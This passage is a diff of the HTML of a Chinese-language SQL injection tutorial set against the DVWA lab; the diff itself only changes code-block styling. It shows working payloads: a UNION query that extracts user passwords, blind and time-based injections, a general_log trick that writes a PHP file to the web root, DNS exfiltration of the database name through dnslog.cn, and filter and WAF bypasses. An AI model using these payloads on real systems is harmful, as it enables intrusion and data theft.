+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;show variables like &amp;#39;%general%&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708165305034.png&#34;
 	
 	
 	
@@ -1545,10 +1615,10 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;开启&lt;code&gt;general log&lt;/code&gt;模式：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;set global general_log = on;   
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;设置目录地址：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;set global general_log_file = &amp;#39;D:/WWW/114514.php&amp;#39;;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708165642906.png&#34;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set global general_log = on;   
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;设置目录地址：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set global general_log_file = &amp;#39;D:/WWW/114514.php&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708165642906.png&#34;
 	
 	
 	
@@ -1586,8 +1656,8 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;构造注入payload&#34;&gt;构造注入Payload
 &lt;/h3&gt;&lt;p&gt;我们需要使用数据库中能够触发网络请求的函数，在MySQL中，最常用的是上文提到过的&lt;code&gt;load_file()&lt;/code&gt;：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and load_file(concat(&amp;#39;\\\\&amp;#39;,(select database()),&amp;#39;.624elh.dnslog.cn\\a&amp;#39;))#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当数据库执行这个Payload时，它会尝试使用&lt;code&gt;load_file()&lt;/code&gt;去读取一个网络路径&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and load_file(concat(&amp;#39;\\\\&amp;#39;,(select database()),&amp;#39;.624elh.dnslog.cn\\a&amp;#39;))#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当数据库执行这个Payload时，它会尝试使用&lt;code&gt;load_file()&lt;/code&gt;去读取一个网络路径&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;concat()&lt;/code&gt;函数会将各部分拼接起来，构造出一个完整的UNC路径：&lt;code&gt;\\dvwa.624elh.dnslog.cn\a&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;为了访问这个网络路径，服务器的操作系统必须先解析主机名 &lt;code&gt;dvwa.624elh.dnslog.cn&lt;/code&gt;，因此它会向DNS服务器发起一个DNS查询请求&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;回到DNSlog，点击&lt;code&gt;Refresh Record&lt;/code&gt;，将会显示出dns解析记录&lt;/strong&gt;&lt;/p&gt;
@@ -1613,8 +1683,8 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$result&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;mysqli_query&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$conn&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt;);
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;?&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们一般是在查询输入框中输入注入语句，其实也可以在url中：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://example.com/get_vuln.php?id=1&amp;#39; UNION SELECT 1, user, password FROM users#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;id后面其实就是我们之前在输入框中输入的内容&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://example.com/get_vuln.php?id=1&amp;#39; UNION SELECT 1, user, password FROM users#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;id后面其实就是我们之前在输入框中输入的内容&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;==POST请求（登录等）：==&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;php&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$username&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;];
@@ -1673,8 +1743,8 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;dvwa提供了一个修改id的入口，而这个id就是这个页面的一个cookie&lt;/p&gt;
 &lt;p&gt;在拿到我们输入的id值后，它没有经过任何过滤，直接插入了sql语句中，就像普通的sql注入点一样&lt;/p&gt;
 &lt;p&gt;我们点击链接更换新cookie：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and length(database())=4 #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;刷新页面&lt;/strong&gt;，页面显示&lt;code&gt;User ID exists in the database.&lt;/code&gt;，说明查询成功了，也就是数据库名称长度为4&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and length(database())=4 #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;刷新页面&lt;/strong&gt;，页面显示&lt;code&gt;User ID exists in the database.&lt;/code&gt;，说明查询成功了，也就是数据库名称长度为4&lt;/p&gt;
 &lt;p&gt;值得注意的是，这段代码里还有这样的一段：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;rand&lt;/span&gt;( &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#d19a66&#34;&gt;5&lt;/span&gt; ) &lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt; ) {
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e06c75&#34;&gt;sleep&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;rand&lt;/span&gt;( &lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#d19a66&#34;&gt;4&lt;/span&gt; ) );
@@ -1739,8 +1809,8 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;p&gt;但是，空格有很多的绕过方式&lt;/p&gt;
 &lt;h3 id=&#34;注释绕过&#34;&gt;注释绕过
 &lt;/h3&gt;&lt;p&gt;在大多数的数据库（特别是mysql）中，&lt;strong&gt;注释&lt;code&gt;/**/&lt;/code&gt;能够代替空格&lt;/strong&gt;：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39;/**/union/**/select/**/1,database()#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250628203003878.png&#34;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39;/**/union/**/select/**/1,database()#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250628203003878.png&#34;
 	
 	
 	
@@ -1770,8 +1840,8 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;/ul&gt;
 &lt;p&gt;虽然过滤了普通空格，但是其他的符号仍然可以起到空格相等的作用&lt;/p&gt;
 &lt;p&gt;制表符等都是不可见字符，我们需要使用url编码来表示他们，比如：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39;%0dunion%0dselect%0d1,database()#
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;括号绕过&#34;&gt;括号绕过
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39;%0dunion%0dselect%0d1,database()#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;括号绕过&#34;&gt;括号绕过
 &lt;/h3&gt;&lt;h4 id=&#34;数字型&#34;&gt;数字型
 &lt;/h4&gt;&lt;p&gt;mysql数据库有这样一个特性：&lt;/p&gt;
 &lt;ul&gt;
@@ -1783,8 +1853,8 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;结合substring()，我们就能构造出下面的不带有空格注入：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1=(ascii(substring(database(),1,1))=100)
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;如果数据库名称第一个字符不是d，那么就会是1=0，和正常的输入1的结果是完全不同的&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1=(ascii(substring(database(),1,1))=100)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;如果数据库名称第一个字符不是d，那么就会是1=0，和正常的输入1的结果是完全不同的&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;这个思想和盲注异曲同工，但是你可能也发现了，上面的payload只适用于数字型的注入&lt;/p&gt;
 &lt;h4 id=&#34;字符型数字型&#34;&gt;字符型&amp;amp;数字型
 &lt;/h4&gt;&lt;p&gt;mysql数据库还有一个特性：&lt;/p&gt;
@@ -1793,10 +1863,10 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;/ul&gt;
 &lt;p&gt;如果我们想要在字符型进行空格的括号绕过，可以使用()把and后面的表达式包裹起来（前提是有返回值）&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;上文提到的&lt;code&gt;sleep()&lt;/code&gt;函数其实是有返回值的，执行成功为1，失败为0，因此可以使用()包裹：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39;and(sleep((ascii(substring(database(),1,1))=100)+4))#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;而if()函数的返回值则取决于我们写在if里面的函数：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39;and(if(length(database())=4,sleep(5),1))#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;效果和时间盲注相同，这种方式可以用在字符型，也可以用在数字型&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39;and(sleep((ascii(substring(database(),1,1))=100)+4))#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;而if()函数的返回值则取决于我们写在if里面的函数：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39;and(if(length(database())=4,sleep(5),1))#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;效果和时间盲注相同，这种方式可以用在字符型，也可以用在数字型&lt;/p&gt;
 &lt;p&gt;如果逗号被过滤，一般也要使用括号绕过：&lt;a class=&#34;link&#34; href=&#34;#%e7%bb%95%e8%bf%87%e5%87%bd%e6%95%b0%e5%8f%82%e6%95%b0%e4%b8%ad%e7%9a%84%e9%80%97%e5%8f%b7&#34; &gt;逗号绕过——绕过函数参数中的逗号
     
 &lt;/a&gt;&lt;/p&gt;
@@ -1804,8 +1874,8 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;/h2&gt;&lt;h3 id=&#34;绕过特定屏蔽词&#34;&gt;绕过特定屏蔽词
 &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;为了保持和其他数据库的兼容，mysql数据库会执行放在&lt;code&gt;/*!...*/&lt;/code&gt;里面的语句&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;这样，如果WAF限制了不能使用一些查询语句，我们就可以把它放在&lt;code&gt;/*!...*/&lt;/code&gt;里，比如：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union/*!select*/ 1,2 #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;WAF会把它看成&amp;quot;带有奇怪符号的注释&amp;quot;而放行，但是到了mysql环境里，就能被执行：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union/*!select*/ 1,2 #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;WAF会把它看成&amp;quot;带有奇怪符号的注释&amp;quot;而放行，但是到了mysql环境里，就能被执行：&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250629194535907.png&#34;
 	
 	
@@ -1818,15 +1888,15 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;我们还可以在&lt;code&gt;/*!...*/&lt;/code&gt;里面加上版本号：&lt;code&gt;/*!50001...*/&lt;/code&gt;，表示数据库是5.00.01及以上版本，该语句才会被执行&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;我使用的dvwa的mysql版本是5.5.53，如果使用&lt;code&gt;1&#39; union/*!60001select*/ 1,2 #&lt;/code&gt;，就会报版本错：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#39;1,2 #&amp;#39;&amp;#39; at line 1
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;干扰waf过滤&#34;&gt;干扰WAF过滤
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#39;1,2 #&amp;#39;&amp;#39; at line 1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;干扰waf过滤&#34;&gt;干扰WAF过滤
 &lt;/h3&gt;&lt;p&gt;有的WAF过滤覆盖的范围可能不够大，比如会过滤掉&lt;code&gt;order by&lt;/code&gt;，但是如果在中间加上&lt;code&gt;/*!10440*/&lt;/code&gt;：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; or 1=1 order/*!10440*/by 1#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样很可能就能让WAF识别错误，如果一个内联注释不行，就多来几个：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; or 1=1 order/*!77777cz*//*!77777cz*/by 1#
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; or 1=1 order/*!10440*/by 1#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样很可能就能让WAF识别错误，如果一个内联注释不行，就多来几个：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-texttext&#34; data-lang=&#34;texttext&#34;&gt;1&amp;#39; or 1=1 order/*!77777cz*//*!77777cz*/by 1#
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或者干脆使用普通的注释干扰：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; or 1=1 order/*%%!asd%%%%*/by 1#
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3-大小写绕过&#34;&gt;#3 大小写绕过
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; or 1=1 order/*%%!asd%%%%*/by 1#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3-大小写绕过&#34;&gt;#3 大小写绕过
 &lt;/h2&gt;&lt;p&gt;有的WAF只针对小写的（或者大写的）查询语句做了过滤：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;];
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;strpos&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;union&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#56b6c2&#34;&gt;!&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;mark&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;false&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;strpos&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;select&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#56b6c2&#34;&gt;!&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;mark&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;false&lt;/span&gt;) {
@@ -1834,27 +1904,27 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM users WHERE user_id = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;然而很多sql数据库是不区分大小写的&lt;/strong&gt;，我们就可以大小写交错写来绕过：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; uNiOn sElEcT 1,database()#
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;4-双写绕过&#34;&gt;#4 双写绕过
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; uNiOn sElEcT 1,database()#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4-双写绕过&#34;&gt;#4 双写绕过
 &lt;/h2&gt;&lt;p&gt;部分WAF所做的工作只是简单的把不允许出现的查询内容（比如sql语句）替换成空字符串：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$id_sanitized&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;str_replace&lt;/span&gt;(&lt;span style=&#34;color:#c678dd&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;union&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;select&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;]; );
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM users WHERE user_id = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$id_sanitized&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;; 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这种过滤方式是很不可靠的，因为就算有危险内容，&lt;strong&gt;简陋过滤之后剩下的部分仍然会进入查询（一次过滤）&lt;/strong&gt;&lt;/p&gt;
